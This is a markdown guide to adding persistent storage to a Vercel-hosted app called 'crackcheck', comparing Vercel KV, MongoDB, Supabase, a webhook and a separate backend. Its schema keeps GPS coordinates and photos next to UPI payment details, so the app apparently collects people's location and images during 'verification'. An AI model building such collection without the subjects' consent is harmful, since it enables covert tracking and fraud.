# Vercel Database Setup

Since Vercel serverless functions are stateless, you need an external database to persist data.

## Option 1: Use Vercel KV (Redis) - Recommended

1. **Install Vercel KV**
```bash
npm install @vercel/kv
```

2. **Enable in Vercel Dashboard**
- Go to your project on vercel.com
- Click "Storage" tab
- Create a KV Database
- Copy the environment variables

3. **Update api/verify.js** to use KV:
```javascript
const { kv } = require('@vercel/kv');

// Store verification
await kv.set(`verification:${transactionId}`, verificationData);

// Get all verifications
const keys = await kv.keys('verification:*');
const verifications = await Promise.all(
    keys.map(key => kv.get(key))
);
```

## Option 2: Use MongoDB Atlas (Free Tier)

1. **Create MongoDB Atlas account**
- Go to https://www.mongodb.com/cloud/atlas
- Create free cluster

2. **Get connection string**
- Click "Connect" → "Connect your application"
- Copy connection string

3. **Add to Vercel environment variables**
```
MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/
```

4. **Install MongoDB driver**
```bash
npm install mongodb
```

## Option 3: Use Supabase (PostgreSQL)

1. **Create Supabase project**
- Go to https://supabase.com
- Create new project

2. **Create table**
```sql
CREATE TABLE verifications (
    id SERIAL PRIMARY KEY,
    transaction_id TEXT UNIQUE,
    latitude REAL,
    longitude REAL,
    accuracy REAL,
    amount TEXT,
    recipient_name TEXT,
    recipient_upi TEXT,
    note TEXT,
    photo_data TEXT,
    photo_size INTEGER,
    timestamp BIGINT,
    created_at TIMESTAMP DEFAULT NOW()
);
```

3. **Add to Vercel environment variables**
```
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_KEY=your-anon-key
```

## Option 4: Use Webhook to External Server

If you have your own server, send data there:

1. **Add webhook URL to Vercel environment variables**
```
WEBHOOK_URL=https://your-server.com/api/save
```

2. **The current api/verify.js already supports this!**

## Quick Fix: Deploy Backend Separately

**Best solution for now:**

1. **Deploy backend to a VPS or Heroku**
```bash
# On your VPS
git clone your-repo
cd your-repo
npm install
pm2 start server.js
```

2. **Update script.js to use your backend URL**
```javascript
const response = await fetch('https://your-backend-url.com/api/verify', {
    method: 'POST',
    body: formData
});
```

3. **Keep frontend on Vercel**
- Frontend: `crackcheck.vercel.app`
- Backend: `your-vps-ip:3000` or `your-domain.com`

## Recommended Setup

**For production:**
- Frontend: Vercel (free, fast, HTTPS)
- Backend: Railway/Render (free tier, persistent storage)
- Database: Built-in SQLite on backend server

**Deploy backend to Railway:**
1. Go to https://railway.app
2. Connect GitHub repo
3. Deploy
4. Get URL (e.g., `your-app.railway.app`)
5. Update `script.js` to use Railway URL

This way you get:
- ✅ Fast frontend (Vercel CDN)
- ✅ Persistent database (Railway)
- ✅ Free hosting (both platforms)
- ✅ HTTPS everywhere
